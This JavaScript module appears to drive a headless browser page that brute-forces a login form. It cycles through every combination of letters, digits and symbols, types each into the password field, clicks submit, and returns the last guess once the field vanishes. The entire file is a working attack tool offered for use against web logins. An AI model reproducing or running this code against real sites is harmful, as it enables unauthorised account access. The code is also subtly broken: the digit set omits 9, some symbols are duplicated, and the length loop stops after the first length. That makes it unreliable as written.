const UTILS = require('./utils');

function letters(MAJ = true, NUMBERS = true, SPECIALS = true) {
  const caps = [...Array(26)].map((val, i) => String.fromCharCode(i + 65));
  const numbers = NUMBERS ? [...Array(9)].map((val, i) => String.fromCharCode(i + 48)) : [];
  const capsMAJ = MAJ ? [...Array(26)].map((val, i) => String.fromCharCode(i + 65).toLowerCase()) : [];
  const selectedSpecialCharacters = SPECIALS ? ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '+', '-', '.', '~', '|', '<', '>', '=', '-', '_', '/', ':', ';', '?', '[', ']', '{', '}', '~'] : [];

  return [...caps, ...capsMAJ, ...numbers, ...selectedSpecialCharacters];
}

async function generateNoRecursion(page, len, chars) 
{
    // Indices that indicate what char to use on corresponding place.
    var indices = [];
    var lastWordTest = "";
    for (var i = 0; i < len; ++i)
        indices.push(0);

    // While all indices in set of chars
    while (indices[0] < chars.length)
    {
        if(await page.$(`#${UTILS.IDINPUTPASSWORD}`)) {
            // Print current solution
        var str = "";
        for (var i = 0; i < indices.length; ++i)
            str += chars[indices[i]];
        //console.log(str);
        await page.focus(`#${UTILS.IDINPUTPASSWORD}`);
        await page.keyboard.press('Home');
        await page.keyboard.down('Control');
        await page.keyboard.press('A');
        await page.keyboard.up('Control');
        await page.keyboard.press('Delete')
        await page.keyboard.type(str);
        await page.click(`#${UTILS.IDBUTTON}`)
        lastWordTest = str
        // Go to next solution by incrementing last index and adjusting
        // if it is out of chars set.
        indices[len-1]++;
        for (var i = len-1; i > 0 && indices[i] == chars.length; --i)
        {
            indices[i] = 0;
            indices[i-1]++;
        }
        } else {
            return lastWordTest;
        }

        
    }
}

async function brute(page, min, max)
{
    for (var l = min; l <= max; ++l)
        return await generateNoRecursion(page, l, letters(UTILS.MAJ, UTILS.NUMBERS, UTILS.SPECIALS));
}

module.exports = {
  brute
}